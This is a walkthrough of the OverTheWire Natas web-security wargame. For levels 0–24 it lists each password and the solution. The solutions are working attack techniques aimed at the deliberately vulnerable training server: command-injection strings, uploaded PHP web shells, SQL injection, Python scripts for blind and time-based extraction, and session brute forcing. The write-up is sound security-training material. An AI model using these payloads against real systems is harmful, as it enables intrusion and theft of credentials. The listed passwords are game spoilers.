# Natas wargame writeups

Home page: https://overthewire.org/wargames/natas/

## Connect the game

```
http://natas<level>.natas.labs.overthewire.org
```
with `<level>` is your level's room

+ no SSH login
+ all passwords are also stored in `/etc/natas_webpass/natas<level>`

## Notes for game

+ view source, devtools
+ Burpsuite skills
+ php sandbox https://onlinephp.io/

## Walkthrough

| Username | Password |
| :--- | :--- |
| natas0 | natas0 |

```
Ctrl+U to view source
```

| Username | Password |
| :--- | :--- |
| natas1 | g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 |

```
Ctrl+U to view source
```

| Username | Password |
| :--- | :--- |
| natas2 | h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 |

```
Ctrl+U to view source
see an image, but a file folder
http://natas2.natas.labs.overthewire.org/files/users.txt
```

| Username | Password |
| :--- | :--- |
| natas3 | G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q |

```
Ctrl+U to view source
check /robots.txt because google will find it
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

| Username | Password |
| :--- | :--- |
| natas4 | tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm |

```
use BurpSuite catch requests
click Refresh
change Referer: http://natas5.natas.labs.overthewire.org/
```

| Username | Password |
| :--- | :--- |
| natas5 | Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD |

```
use BurpSuite catch requests
change Cookie: loggedin=1
```

| Username | Password |
| :--- | :--- |
| natas6 | fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR |

```
check sourcecode php
http://natas6.natas.labs.overthewire.org/includes/secret.inc
input secret: FOEIUWGHFEEUHOFUOIU
```

| Username | Password |
| :--- | :--- |
| natas7 | jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr |

```
Ctrl+U to view source
path traversal ?page=home
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

| Username | Password |
| :--- | :--- |
| natas8 | a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB |

```
check sourcecode php
reverse the code to get secret
<?php
echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
?>
input secret: oubWYf2kBq
```

| Username | Password |
| :--- | :--- |
| natas9 | Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd |

```
check sourcecode php
command injection
find words containing: ; cat /etc/natas_webpass/natas10;
```

| Username | Password |
| :--- | :--- |
| natas10 | D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE |

```
check sourcecode php
use grep character in many files
find words containing: 11* /etc/natas_webpass/natas11
```

| Username | Password |
| :--- | :--- |
| natas11 | 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg |

```
check sourcecode php
check cookie data
reverse the code to get $key
<?php
$originalString = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
$cookieString = base64_decode('MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLX54bjY=');
echo $originalString ^ $cookieString;
?>
rebuild cookie with our payload
<?php
$key = 'KNHL';
$newString = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$cookieData = '';
for ($i = 0; $i < strlen($newString); $i++) {
  $cookieData .= $key[$i % strlen($key)] ^ $newString[$i];
}
echo base64_encode($cookieData);
?>
change cookie data to MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
```

| Username | Password |
| :--- | :--- |
| natas12 | YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG |

```
check sourcecode php
create a file natas12.php
<?php
echo exec("cat /etc/natas_webpass/natas13");
?>
inspect and change field input filename to php
upload and go to that file to see result
```

| Username | Password |
| :--- | :--- |
| natas13 | lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9 |

```
check sourcecode php
EXIF image type is checked
create a file natas13.php with padding magic bytes
.....<?php
echo exec('cat /etc/natas_webpass/natas14');
?>
edit first 4 hex pairs to FF D8 FF EE (jpeg)
inspect and change field input filename to php
upload and go to that file to see result
```

| Username | Password |
| :--- | :--- |
| natas14 | qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP |

```
check sourcecode php
SQL injection
input username or password: " or 1=1 --
```

| Username | Password |
| :--- | :--- |
| natas15 | TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB |

```
check sourcecode php
try a brute force attack
first, identify the password charset
import requests
target = 'http://natas15.natas.labs.overthewire.org'
charset = (
	'0123456789' +
	'abcdefghijklmnopqrstuvwxyz' +
	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)
charset = ''
for c in charset:
	username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
	r = requests.get(target,
		auth=('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
		params={"username": username}
	)
	if "This user exists" in r.text:
		charset += c
		print ('CSET: ' + charset.ljust(len(charset), '*'))
now, brute force attack against previous charset
import requests
target = 'http://natas15.natas.labs.overthewire.org'
charset = "23579adfgijklqruADEHOPRTVZ"
password = ""
while len(password) != 32:
	for c in charset:
		t = password + c
		username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
		r = requests.get(target,
			auth=('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
			params={"username": username}
		)
		if "This user exists" in r.text:
			print ('PASS: ' + t.ljust(32, '*'))
			password = t
			break
```

| Username | Password |
| :--- | :--- |
| natas16 | TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V |

```
check sourcecode php
test input: $(echo Africans)
now, start brute force it
import requests
target = 'http://natas16.natas.labs.overthewire.org'
charset = (
	'0123456789' +
	'abcdefghijklmnopqrstuvwxyz' +
	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)
p = ''
i = 0
while len(p) != 32:
	while i < len(charset):
		c = charset[i]
		needle = ('$(grep -E ^%s%c.* /etc/natas_webpass/natas17)Africans' % (p, c))
		r = requests.get(target,
			auth=('natas16','TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'),
			params={"needle": needle}
		)
		if "Africans" not in r.text:
			p += c
			print ('P: ' + p.ljust(32, '*'))
			i = 0
		else:
			i += 1
```

| Username | Password |
| :--- | :--- |
| natas17 | XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd |

```
check sourcecode php
time-based blind SQL injection
now, start brute force it
import requests
pwd_len = 32
charset_0 = (
	'0123456789' +
	'abcdefghijklmnopqrstuvwxyz' +
	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)
charset_1 = ''
target = 'http://natas17.natas.labs.overthewire.org'
auth=('natas17','XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
sleep_time = 10
for c in charset_0:
	username = 'natas18" AND IF(password LIKE BINARY "%%%c%%",SLEEP(%d), 1)#' % (c, sleep_time)
	r = requests.get(target, auth=auth, params={"username": username}
	)
	s = r.elapsed.total_seconds()
	if s >= sleep_time:
		charset_1 += c
		print ('C: ' + charset_1.ljust(len(charset_0), '*'))
print()
password = ""
while len(password) != pwd_len:
	for c in charset_1:
		t = password + c
		username = 'natas18" AND IF(password LIKE BINARY "%s%%",SLEEP(%d), 1)#' % (t, sleep_time)
		r = requests.get(target, auth=auth, params={"username": username}
		)
		s = r.elapsed.total_seconds()
		if s >= sleep_time:
			print ('P: ' + t.ljust(pwd_len, '*'))
			password = t
			break
```

| Username | Password |
| :--- | :--- |
| natas18 | 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq |

```
check sourcecode php
Session Hijacking
now, start brute force it
import requests
target = 'http://natas18.natas.labs.overthewire.org'
auth = ('natas18','8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
params = dict(username='admin', password='pass')
cookies = dict()
max_s_id = 640
s_id = 1
while s_id <= max_s_id:
	print("PHPSESSID = " + str(s_id))
	cookies = dict(PHPSESSID=str(s_id))
	r = requests.get(target, auth=auth, params=params, cookies=cookies)
	if "You are an admin" in r.text:
		print (r.text)
		break
	s_id += 1
```

| Username | Password |
| :--- | :--- |
| natas19 | 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s |

```
login with admin:pass
check cookie PHPSESSID: 3535362d61646d696e
after research with diffirent account
check cookie PHPSESSID: 3237312d61646d696e
our PHPSESSID should be like this: ******2d61646d696e
now, start brute force it
import requests
import sys
target = 'http://natas19.natas.labs.overthewire.org'
auth = ('natas19','8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
params = dict(username='admin', password='pass')
cookies = dict()
x = 0x0
y = 0x0
z = 0x0
while x <= 0xf:
    while y <= 0xf:
        while z <= 0xf:
            phpsessid = (('3%s3%s3%s2d61646d696e') %
                         (hex(x)[2:], hex(y)[2:], hex(z)[2:]))
            cookies['PHPSESSID'] = phpsessid
            print('Trying with: %s' % phpsessid)
            r = requests.get(target, auth=auth, params=params, cookies=cookies)
            if "You are logged in as a regular user." not in r.text:
                print(r.text)
                sys.exit(0)
            z += 1
        y += 1
        z = 0x0
    x += 1
    y = 0x0
    z = 0x0
sys.exit(1)
```

| Username | Password |
| :--- | :--- |
| natas20 | guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH |

```
check sourcecode php
now, write script to reverse it
import requests
target = 'http://natas20.natas.labs.overthewire.org'
auth = ('natas20', 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH')
params = dict(name='admin\nadmin 1', debug='')
cookies = dict()
r = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
print(r.text)
print()
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(target, auth=auth, params=params, cookies=cookies)
print(r.text)
```

| Username | Password |
| :--- | :--- |
| natas21 | 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56 |

```
check sourcecode php
two websites are sharing the same session
import requests
target = 'http://natas21-experimenter.natas.labs.overthewire.org'
auth = ('natas21', '89OWrTkGmiLZLv12JY4tLj2c4FW0xn56')
params = dict(debug='', submit='', admin=1)
cookies = dict()
r = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
print(r.text)
target = 'http://natas21.natas.labs.overthewire.org'
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(target, auth=auth, params=params, cookies=cookies)
print(r.text)
```

| Username | Password |
| :--- | :--- |
| natas22 | 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s |

```
check sourcecode php
curl -i -XGET -u natas22:91awVM9oDiUGm33JdzM7RVLBS8bz9n0s http://natas22.natas.labs.overthewire.org/?revelio
```

| Username | Password |
| :--- | :--- |
| natas23 | qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj |

```
check sourcecode php
input password: 11iloveyou
```

| Username | Password |
| :--- | :--- |
| natas24 | 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r |

```
check sourcecode php
https://natas24.natas.labs.overthewire.org/?passwd[]=1
```

| Username | Password |
| :--- | :--- |
| natas25 | O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx |
